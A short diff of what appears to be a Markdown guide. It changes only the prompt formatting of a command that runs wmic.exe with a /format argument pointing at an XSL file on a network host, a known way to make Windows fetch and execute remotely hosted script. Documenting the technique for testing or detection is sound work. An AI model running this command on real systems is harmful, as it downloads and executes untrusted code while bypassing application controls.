@@ -24,5 +24,5 @@ xmlns:user="http://mycompany.com/mynamespace">
 Then execute it with wmic.exe as follows:
 
 ```
-C:\wmic process get brief /format:"http://192.168.1.1/test.xsl"
+C:\> wmic process get brief /format:"http://192.168.1.1/test.xsl"
 ```
